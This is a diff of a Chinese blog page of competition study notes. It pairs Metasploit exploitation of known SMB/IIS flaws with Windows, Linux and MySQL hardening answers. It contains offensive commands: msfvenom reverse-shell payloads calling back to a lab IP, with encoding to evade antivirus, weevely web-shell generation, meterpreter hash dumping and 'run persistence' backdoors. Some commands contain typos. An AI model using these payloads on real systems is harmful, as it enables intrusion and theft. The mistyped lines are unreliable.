@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="网络安全笔记整理, Note">
-    <meta name="description" content="赛题笔记">
+    <meta name="description" content="包括常见的漏洞及攻击、常用工具、常用的命令等">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -326,21 +326,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-10
+                    2023-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    16 分
                 </div>
                 
 
@@ -360,74 +360,103 @@
         
 
         
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="常用漏洞及其端口"><a href="#常用漏洞及其端口" class="headerlink" title="常用漏洞及其端口"></a>常用漏洞及其端口</h1><ul>
-<li><h5 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>nmap –script smb-vuln-ms08-067<br><strong>效果：</strong>获取到目标靶机的meterpreter</p>
+<li><h5 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>nmap –script smb-vuln-ms08-067<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p>
 <blockquote>
-<p>注：必须手动设置正确的target、可用check</p>
+<p>注：必须手动设置正确的target、可用check、脚本扫描和设置错误的target都会破坏漏洞</p>
 </blockquote>
 </li>
-<li><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>有配套的扫描模块<br><strong>效果：</strong>获取到目标靶机的meterpreter</p>
+<li><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>有配套的扫描模块<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p>
 </li>
-<li><h5 id="is-known-pipename"><a href="#is-known-pipename" class="headerlink" title="is_known_pipename"></a>is_known_pipename</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb3.X-4.X，smb3.5.0-4.6.4的中间版本<br><strong>效果：</strong>获取到目标靶机的shell<br><strong>漏洞修复：</strong> /etc/samba/smb.conf 76行添加<code>nt pipe support = no</code>,然后重启服务：<code>service smb restart</code></p>
+<li><h5 id="is-known-pipename"><a href="#is-known-pipename" class="headerlink" title="is_known_pipename"></a>is_known_pipename</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>Liunx：smb3.X-4.X，smb3.5.0-4.6.4的中间版本<br><strong>效果：</strong>获取到目标靶机的shell<br><strong>漏洞修复：</strong> /etc/samba/smb.conf 76行添加<code>nt pipe support = no</code>,然后重启服务：<code>service smb restart</code></p>
 </li>
 <li><h5 id="CVE-2017-7269"><a href="#CVE-2017-7269" class="headerlink" title="CVE-2017-7269"></a>CVE-2017-7269</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS 6.0<br><strong>发现方式：</strong>使用nmap –script http-webdav-scan<br><strong>效果：</strong>获取到目标靶机的meterpreter</p>
+<blockquote>
+<p>注：搜索不到，exploit/windows/iis/cve_2017_7269</p>
+</blockquote>
 </li>
-<li><h5 id="vsftpd2-3-4（笑脸漏洞）"><a href="#vsftpd2-3-4（笑脸漏洞）" class="headerlink" title="vsftpd2.3.4（笑脸漏洞）"></a>vsftpd2.3.4（笑脸漏洞）</h5><p><strong>对应端口：</strong>21<br><strong>对应服务：</strong>vsftpd2.3.4<br><strong>利用方式：</strong>使用msf搜索vsftpd，或者ftp使用root:)，密码空登录，然后nc 6200端口<br><strong>效果：</strong>获取到目标靶机的meterpreter</p>
-</li>
-<li><h5 id="mssql-exec"><a href="#mssql-exec" class="headerlink" title="mssql_exec"></a>mssql_exec</h5><p><strong>对应端口：</strong>1433<br><strong>对应服务：</strong>mssql<br><strong>利用条件：</strong>通过暴力破解获得密码（默认账号sa）<br><strong>效果：</strong>可以执行cmd指令</p>
-</li>
-<li><h5 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12_020"></a>MS12_020</h5><p><strong>对应端口：</strong>3389<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏</p>
-</li>
-<li><h5 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15_034"></a>MS15_034</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>加固方法：</strong>关闭内核缓存</p>
+<li><h5 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15_034"></a>MS15_034</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>加固方法：</strong>服务器管理器中关闭内核缓存</p>
 </li>
 <li><h5 id="CVE-2017-8464"><a href="#CVE-2017-8464" class="headerlink" title="CVE-2017-8464"></a>CVE-2017-8464</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>PHP<br><strong>攻击条件：</strong>需要拿到shell，执行生成的php代码<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p>
 </li>
+<li><h5 id="vsftpd2-3-4（笑脸漏洞）"><a href="#vsftpd2-3-4（笑脸漏洞）" class="headerlink" title="vsftpd2.3.4（笑脸漏洞）"></a>vsftpd2.3.4（笑脸漏洞）</h5><p><strong>对应端口：</strong>21<br><strong>对应服务：</strong>vsftpd2.3.4<br><strong>利用方式：</strong>使用msf搜索vsftpd，或者ftp使用root:)，密码空登录，然后nc 6200端口<br><strong>效果：</strong>获取到目标靶机的shell</p>
+</li>
+<li><h5 id="mssql-exec"><a href="#mssql-exec" class="headerlink" title="mssql_exec"></a>mssql_exec</h5><p><strong>对应端口：</strong>1433<br><strong>对应服务：</strong>mssql<br><strong>利用条件：</strong>通过暴力破解获得密码（默认账号sa）<br><strong>效果：</strong>可以执行cmd指令</p>
+<blockquote>
+<p>注：开启远程桌面命令需要对“和\使用\转义</p>
+</blockquote>
+</li>
+<li><h5 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12_020"></a>MS12_020</h5><p><strong>对应端口：</strong>3389<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>修复方法：</strong>服务（services.msc）中关闭Remote Desktop Services</p>
+</li>
+<li><h5 id="ms14-064"><a href="#ms14-064" class="headerlink" title="ms14_064"></a>ms14_064</h5><p><strong>利用方式：</strong>需要通过远程桌面点击恶意链接<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）（仅限windows）</p>
+</li>
 <li><h5 id="CVE-2018-4878"><a href="#CVE-2018-4878" class="headerlink" title="CVE-2018-4878"></a>CVE-2018-4878</h5><p><strong>攻击条件：</strong>需要Flash 0Day漏洞<br><strong>效果：</strong>将产生的攻击载荷放在80端口的index.html，用（exploit/multi/handler）监听，等待靶机访问</p>
 </li>
-<li><h5 id="ms14-064"><a href="#ms14-064" class="headerlink" title="ms14_064"></a>ms14_064</h5><p><strong>利用方式：</strong>需要通过远程桌面点击恶意链接<br><strong>效果：</strong>获取到目标靶机的<code>最高</code>meterpreter权限</p>
-</li>
-<li><h5 id="Java-store"><a href="#Java-store" class="headerlink" title="Java_store"></a>Java_store</h5><p><strong>攻击条件：</strong>存在java无效数组索引漏洞，java安全等级低，需要通过远程桌面点击恶意链接。<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p>
-</li>
 <li><h5 id="MS11-003"><a href="#MS11-003" class="headerlink" title="MS11_003"></a>MS11_003</h5><p><strong>攻击条件：</strong>ie8浏览器存在css漏洞<br><strong>效果：</strong>生成钓鱼链接，别人访问链接之后产生session</p>
+<blockquote>
+<p>注: target必须设置正确</p>
+</blockquote>
+</li>
+<li><h5 id="Java-store"><a href="#Java-store" class="headerlink" title="Java_store"></a>Java_store</h5><p><strong>攻击条件：</strong>存在java无效数组索引漏洞，java安全等级低，需要远程桌面点击恶意链接。<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p>
+<blockquote>
+<p>注: payload最好使用http</p>
+</blockquote>
 </li>
 <li><h5 id="Esteemaudit"><a href="#Esteemaudit" class="headerlink" title="Esteemaudit"></a>Esteemaudit</h5><p><strong>攻击条件：</strong>windows2003或xp，开启域和远程桌面<br><strong>对应端口：</strong>135，139，3389<br><strong>效果：</strong>获取到目标靶机的<code>最高</code>meterpreter权限</p>
 </li>
+<li><h5 id="exploit-x2F-multi-x2F-handler"><a href="#exploit-x2F-multi-x2F-handler" class="headerlink" title="exploit/multi/handler"></a>exploit/multi/handler</h5></li>
 </ul>
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="1-常用DOS命令："><a href="#1-常用DOS命令：" class="headerlink" title="1.常用DOS命令："></a>1.常用DOS命令：</h2><ul>
+<p><strong>效果：</strong>监听端口，推荐使用-j后台运行</p>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="1-DOS命令："><a href="#1-DOS命令：" class="headerlink" title="1.DOS命令："></a>1.DOS命令：</h2><ul>
 <li><strong>systeminfo:</strong> 查看系统信息</li>
-<li>**tasklist /svc: ** 计算机进程</li>
-<li><strong>netstat -an:</strong> 端口</li>
+<li><strong>tasklist /svc:</strong> 计算机进程</li>
+<li><strong>netstat -an:</strong>  查看开放的端口</li>
 <li><strong>REG ADD HKLM/SYSTEM/CurrentControlSet/Control/Terminal “ “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f：</strong>开启3389端口</li>
 <li><strong>|findstr:</strong> 字符串过滤</li>
+<li><strong>wmic process where name = “进程名” get name,executablepath:</strong> 查找进程</li>
 <li><strong>net config:</strong> 配置服务器或域相关设置</li>
 <li><strong>type:</strong> 显示文件内容</li>
 <li><strong>wce.exe -w:</strong> 导出本地用户hash</li>
 <li><strong>set log:</strong> 查看域控主机名</li>
+<li><strong>shell:startup:</strong> 打开启动运行文件夹</li>
 </ul>
-<h2 id="2-常用meterpreter命令"><a href="#2-常用meterpreter命令" class="headerlink" title="2.常用meterpreter命令"></a>2.常用meterpreter命令</h2><ul>
+<h2 id="2-linux命令："><a href="#2-linux命令：" class="headerlink" title="2.linux命令："></a>2.linux命令：</h2><ul>
+<li><strong>locate 关键词:</strong> 查找文件</li>
+<li><strong>|grep:</strong> 过滤字符</li>
+</ul>
+<h2 id="3-meterpreter命令"><a href="#3-meterpreter命令" class="headerlink" title="3.meterpreter命令"></a>3.meterpreter命令</h2><ul>
 <li><strong>sysinfo:</strong> 查看系统信息</li>
 <li><strong>shell:</strong> 打开终端</li>
 <li><strong>load mimikatz(Kiwi):</strong> wdigest可以获取管理员密码</li>
+<li><strong>run getgui -e</strong>:启动目标靶机的远程桌面服务</li>
 <li><strong>del:</strong> 删除文件</li>
 <li><strong>edit:</strong> 编辑文件</li>
+<li><strong>cat:</strong> 读取文件</li>
 <li><strong>reboot:</strong> 重启</li>
 <li><strong>ps:</strong> 查看运行进程pid</li>
 <li><strong>migrate：</strong>迁移进程</li>
 <li><strong>getpid:</strong> 查看当前的进程号</li>
 <li><strong>background:</strong> 将会话置于后台</li>
 <li><strong>hashdump:</strong> 获取哈希密码（如果不行可以搜索使用hashdunp模块）（配合linux ophcrack解密工具）</li>
-<li><strong>getuid:</strong> 查看权限</li>
-<li><strong>getsystem:</strong> 提权</li>
+<li><strong>getuid、getsystem、getprivs:</strong> 提权</li>
+<li><strong>:</strong> 提权</li>
 <li><strong>background:</strong> 切换到后台运行</li>
+<li><strong>run persistence:</strong> 注入后门（-X 开机时自动加载 -i 回连的时间间隔 -p 端口号 -r 渗透机ip）</li>
 </ul>
-<h2 id="3-常用数据库命令"><a href="#3-常用数据库命令" class="headerlink" title="3.常用数据库命令"></a>3.常用数据库命令</h2><ul>
-<li><strong>mysql -uroot -proot:</strong> 登录数据库</li>
+<h2 id="4-常用数据库命令"><a href="#4-常用数据库命令" class="headerlink" title="4.常用数据库命令"></a>4.常用数据库命令</h2><ul>
+<li><strong>mysql -h 主机地址 -u用户名 -p密码:</strong> 登录数据库</li>
 <li><strong>select version():</strong> 查看数据库版本 </li>
 <li><strong>show databases:</strong> 显示所有数据库</li>
 <li><strong>drop database 数据库名:</strong> 删除数据库</li>
+<li>**drop user ‘username‘@’%’: 删除用户</li>
 <li><strong>create database 数据库名：</strong> 新建数据库</li>
 <li><strong>use 数据库名：</strong> 使用数据库</li>
 <li><strong>show tables:</strong> 显示当前数据库中的所有数据表</li>
@@ -436,33 +465,81 @@
 <li><strong>update 数据表 set 字段 = ‘新值’ where 条件：</strong> 修改用户表</li>
 <li><strong>flush privileges:</strong> 刷新权限</li>
 <li><strong>show grants for 用户名@’主机地址’：</strong> 查看当前用户权限</li>
-<li><strong>grant 权限 on 数据库名.表名 to 用户名@’主机名’ ：</strong>授权</li>
-<li><strong>grant 权限 on 数据库名.表名 to 用户名@’主机名’（*.*表示所有表）：</strong>授权</li>
+<li><strong>grant 权限 on 数据库名.表名 to 用户名@’主机名’（*.*表示所有数据库所有表）：</strong>授权</li>
 </ul>
-<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="netdiscover-网络扫描工具"><a href="#netdiscover-网络扫描工具" class="headerlink" title="netdiscover(网络扫描工具)"></a>netdiscover(网络扫描工具)</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netdiscover -r 目标网段  （-r 扫描范围，例如192.168.0.0/24，仅支持/8, /16和/24）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="dirb-基于字典的web目录扫描工具"><a href="#dirb-基于字典的web目录扫描工具" class="headerlink" title="dirb(基于字典的web目录扫描工具)"></a>dirb(基于字典的web目录扫描工具)</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirb http://192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="nikto-Web漏洞扫描神器"><a href="#nikto-Web漏洞扫描神器" class="headerlink" title="nikto(Web漏洞扫描神器)"></a>nikto(Web漏洞扫描神器)</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nikto -host http://172.168.1.105<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh 客户端用户名@服务器ip地址
--X 调用图形界面
--p 选项来修改端口号，默认22
--i 使用私钥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u "http://172.16.1.1/login.php" --forms --level 3 --dbs
---forms 针对form表单
---level 扫描级别，1-5，默认是1,越高越强
---dbs 查看数据库
--D 数据库名
--T 表名
---dump 导出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
--p 载荷
--f 输出格式
--e 编码免杀
--i 编码次数
--a 架构平台
--o 文件输出
-//编码型
-msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>nmap -O 无法看到详细的系统版本（ms08_067）</p>
+<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
+<li><strong>-sS:</strong> TCP同步扫描，半开放式</li>
+<li><strong>-sV:</strong> 扫描系统服务及版本信息</li>
+<li><strong>-sC:</strong> 调用默认的服务扫描脚本</li>
+<li><strong>-sP:</strong> ping扫描</li>
+<li><strong>-Pn:</strong> 不进行ping</li>
+<li><strong>-oX xx.xml:</strong> 以xml格式输出</li>
+<li><strong>-O:</strong> 操作系统扫描</li>
+</ul>
+<h2 id="netdiscover-网络扫描工具"><a href="#netdiscover-网络扫描工具" class="headerlink" title="netdiscover(网络扫描工具)"></a>netdiscover(网络扫描工具)</h2><p><strong>netdiscover -r 目标网段  （-r 扫描范围，例如192.168.0.0/24）</strong></p>
+<h2 id="dirb-基于字典的web目录扫描工具"><a href="#dirb-基于字典的web目录扫描工具" class="headerlink" title="dirb(基于字典的web目录扫描工具)"></a>dirb(基于字典的web目录扫描工具)</h2><p><strong>dirb http://192.168.1.0/24</strong></p>
+<h2 id="nikto-Web漏洞扫描神器"><a href="#nikto-Web漏洞扫描神器" class="headerlink" title="nikto(Web漏洞扫描神器)"></a>nikto(Web漏洞扫描神器)</h2><p><strong>nikto -host http://172.168.1.105</strong></p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><strong>ssh 客户端用户名@服务器ip地址</strong><br><strong>-X</strong> 调用图形界面<br><strong>-p</strong> 选项来修改端口号，默认22<br><strong>-i</strong> 使用私钥</p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>sqlmap -u “http://172.16.1.1/login.php” –forms –level 3 –dbs</strong><br>–forms 针对form表单<br>-l 使用txt文件<br>-p Host 手动指定检查HTTP头中的HOST<br>–level 扫描级别，1-5，默认是1,越高越强<br>–batch 不用询问，使用默认的选项<br>–dbs 显示所有数据库<br>-D 指定数据库<br>–tables 显示选定数据库下的数据表<br>-T 指定数据表<br>–columns 显示选定表中的所有列名<br>-C 指定列名<br>–dump 导出选中的列名</p>
+<h2 id="msfvenom（后门木马生成工具）"><a href="#msfvenom（后门木马生成工具）" class="headerlink" title="msfvenom（后门木马生成工具）"></a>msfvenom（后门木马生成工具）</h2><p>-p 载荷(msfvenom -l payloads)<br>-f 输出格式(msfvenom –help-formats)<br>-o 文件输出<br>-x 绑定软件<br>-e 编码免杀(msfvenom -l encoders)<br>-i 编码次数<br>-a 架构平台(x86/x64)<br>– platform 平台(windows/linux)<br>简单型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -f exe -o payload.exe</strong><br>绑定软件型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -x /root/putty.exe -f exe -o payload.exe</strong><br>编码免杀型：<strong>msfvenom –p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 –e x86/shikata_ga_nai –i 3 –f exe –o C:\back.exe</strong></p>
+<h2 id="weevely（后门木马生成工具）"><a href="#weevely（后门木马生成工具）" class="headerlink" title="weevely（后门木马生成工具）"></a>weevely（后门木马生成工具）</h2><ul>
+<li><strong>weevely generate password path:</strong> 生成后门木马文件</li>
+<li><strong>weevely URL password:</strong> 连接生成的木马</li>
+<li><strong>weevely generate.img password /xx.gif ./ :</strong> 在当前文件夹生成gif木马，只有kail1.0可用</li>
+</ul>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><ul>
+<li><strong>msfdb init:</strong>  初始化数据库</li>
+<li><strong>db_import /xx/xx.xml:</strong> 导入扫描结果</li>
+<li><strong>services:</strong> 查看导入的数据</li>
+<li><strong>host:</strong> 查看导入的主机数据</li>
+<li><strong>exploit/multi/handler:</strong> 监听端口模块</li>
+</ul>
+<h2 id="wireshark（网络抓包工具）"><a href="#wireshark（网络抓包工具）" class="headerlink" title="wireshark（网络抓包工具）"></a>wireshark（网络抓包工具）</h2><ul>
+<li><strong>tcp.connection.syn:</strong> 过滤出tcp协议</li>
+<li><strong>ip.src==:’</strong> 过滤源地址</li>
+<li><strong>ip.dst==:’’</strong> 过滤目标地址</li>
+<li><strong>ip.addr==:</strong> 包括源地址和目标地址</li>
+<li><strong>telnet contains “login’’</strong> 查看目标主机名</li>
+<li><strong>tcp.port==3306:</strong> 过滤3306端口</li>
+<li><strong>ftp-data:</strong> FTP下载的文件</li>
+<li><strong>ftp contains “230” || ftp contains “success”:</strong> 230为FTP服务应答码，表示用户登录</li>
+<li><strong>ftp contains “220” || ftp contains “FTP”:</strong> 220为FTP服务应答码，表示服务就绪</li>
+</ul>
+<h2 id="dissniff"><a href="#dissniff" class="headerlink" title="dissniff"></a>dissniff</h2><p><strong>dissniff -i eth0 -t 21/tcp=ftp,23/tcp=telnet</strong></p>
+<h2 id="you-get"><a href="#you-get" class="headerlink" title="you-get"></a>you-get</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">you-get -c C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\jleeq0k9.default-release\cookies.sqlite -i <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="设备题目"><a href="#设备题目" class="headerlink" title="设备题目"></a>设备题目</h1><h2 id="第一题（windows8）"><a href="#第一题（windows8）" class="headerlink" title="第一题（windows8）"></a>第一题（windows8）</h2><p><strong>1. 设置密码策略必须同时满足大小写字母、数字、特殊字符，最小密码长度不少于8个字符，密码最长使用期限为15天。将服务器上密码策略配置信息截图;</strong><br>开始——管理工具——本地安全策略——账户策略——密码策略<br><strong>2. 在用户登录系统时，应该有“For authorized users only”提示信息，将登录系统时系统弹出警告信息窗口截图;</strong><br>组策略（gpedit.msc）——计算机配置——windows设置——安全设置——本地策略——安全选项——交互式登录——标题和消息文字都设置一下<br><strong>3. 一分钟内仅允许5次登录失败的尝试，超过5次，登录帐号锁定1分钟,将账号锁定策略配置信息截图</strong><br>本地安全策略——账户策略——账户锁定策略<br><strong>4.设置远程桌面用户非活动会话连接超时应小于等于5分钟，将RDP-Tcp属性对应的配置界面截图；</strong><br>设置：组策略——计算机配置——管理模板——windows组件——远程桌面服务——远程桌面会话主机——会话时间限制——设置空闲会话的时间限制<br>查看：管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——会话<br><strong>5.通过SSL（TLS 1.0）加密服务器的远程桌面服务，将RDP-Tcp属性对应的配置界面截图；</strong><br>管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——常规<br><strong>6.仅允许超级管理员账号关闭系统，将关闭系统属性的配置界面截图；</strong><br>本地安全策略——本地策略——用户权限分配——关闭系统<br><strong>7.开启IIS的日志审计记录，日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、服务器端口、方法，将W3C日志记录字段的配置界面截图；</strong><br>开始——管理工具——IIS管理器——日志——格式——选择字段<br><strong>8.设置网站的最大并发连接数为1000，网站连接超时为60s，将编辑网站限制的配置界面截图；</strong><br>网站——IIS的站点——配置——限制<br><strong>9.禁用IIS内核缓存，避免对方利用ms15_034漏洞进行DOS攻击，出现蓝屏的现象，将编辑输出缓存设置的配置界面截图；</strong><br>开始——管理工具——IIS管理器——输出缓存——编辑功能设置<br><strong>10.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录。将user1的登录时间配置界面截图。</strong><br>net user user1 /times:M-F,9:00-18:00         （M、T、W、Th、F、Sa、Su）</p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><strong>1.设置最小密码长度不少于8个字符，密码最长使用期限为15天。将/etc/login.defs配置文件中对应的部分截图;</strong><br>/etc/login.defs<br><strong>2.设置在用户登录系统时，会有“For authorized users only”提示信息，将登录系统时系统弹出提示信息界面截图;</strong><br>/etc/issue  配置文件末尾添加 （存疑）<br>只是这样修改的话在 ssh 连接时是不会有提示信息的，需要修改 ssh 配置文本<br>vim /etc/ssh/sshd_config<br>在下方添加一行 Banner /etc/ssh/banner<br>touch /etc/ssh/banner<br>vim /etc/ssh/banner<br>在文件内添加需要提示的提示信息，完成后集团的重启 SSH 服务 systemctl restart sshd<br><strong>3.设置root用户的计划任务。每天早上7:50自动开启vsftpd服务，22点50时关闭；每周六的7:30时，重新启动vsftpd服务。使用crontab –l 查看计划任务，将回显结果截图；</strong></p>
+<ul>
+<li>crontab -选项：</li>
+<li>-u　　指定用户设定计划</li>
+<li>-e　　进入用户编辑计划</li>
+<li>-l　　列出用户任务计划</li>
+<li>-r　　删除用户任务计划<br>crontab -u root -l<br>50 7 * * * /sbin/service vsftpd start<br>50 22 * * * /sbin/service vsftpd stop<br>30 7 * * 6 /sbin/service vsftpd restart</li>
+</ul>
+<p><strong>4.禁止匿名用户登录vsftpd服务，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>anonymous_enable=no<br><strong>5.限制客户端连接vsftpd服务时，同一个IP最多只能打开两个连接，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>在文件末尾添加：max_per_ip=2<br><strong>6.将SSH服务的端口号修改为2222 ,使用命令netstat -anltp | grep sshd查看SSH服务端口信息，将回显结果截图；</strong><br>Port 2222<br>service sshd restart<br><strong>7.禁止root用户通过SSH远程登录，将/etc/ssh/sshd_config 配置文件中对应的部分截图；</strong><br>RermitRootLogin NO<br><strong>8.禁止mysql服务以管理员权限的账号运行，将/etc/my.cnf配置文件中对应的部分截图；</strong><br>在my.cnf配置文件中配置user=mysql<br><strong>9.删除默认数据库test, 然后使用show databases;命令查看当前的数据库信息，将回显结果截图；</strong><br>drop database test<br><strong>10.将数据库用户user1的密码使用MD5加密，然后在数据库中使用select password from user where user=’user1’;命令查看user1的密码，将回显结果截图。</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>
+flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="A-2任务二-数据库加固（Data）"><a href="#A-2任务二-数据库加固（Data）" class="headerlink" title="A-2任务二 数据库加固（Data）"></a>A-2任务二 数据库加固（Data）</h2><p><strong>1.以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；</strong><br>修改Mysql配置文本，<code>vim /etc/my.cnf</code><br>在 [mysqld] 下方新增一行 <code>user=mysql</code> (如果没有 mysql 用户需要自行创建)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br><strong>2.删除默认数据库(test)；</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">show databases<span class="token punctuation">;</span>
+create database test<span class="token punctuation">;</span>
+drop database test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>3.改变默认Mysql管理员用户为SuperRoot；</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">select User<span class="token punctuation">,</span>Password from user<span class="token punctuation">;</span>
+update user set User <span class="token operator">=</span> <span class="token char">'SuperRoot'</span> where User <span class="token operator">=</span> <span class="token char">'root'</span><span class="token punctuation">;</span>
+<span class="token comment">//将当前user和privilige表中的用户信息/权限设置从mysql库 (MySQL数据库的内置库)中提取到内存里</span>
+flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>4.使用Mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!);</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>
+flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>5.赋予user1用户对数据库所有表只有select,insert,delete,update权限；</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">show grants for 'user1'@'localhost';
+grant select,insert,delete,update on *.* to 'user1'@'localhost';
+flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>6.对忘记mysql数据库root管理员密码进行重置操作</strong><br><code>vim /etc/my.cnf</code><br>在[mysqld]下面加入<br><code>skip-grant-tables</code> (跳过权限检查启动)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br>mysql –u root –p<br>use mysql;<br><code>update user set Password='123.com' where User='root';</code><br>flush privileges;</p>
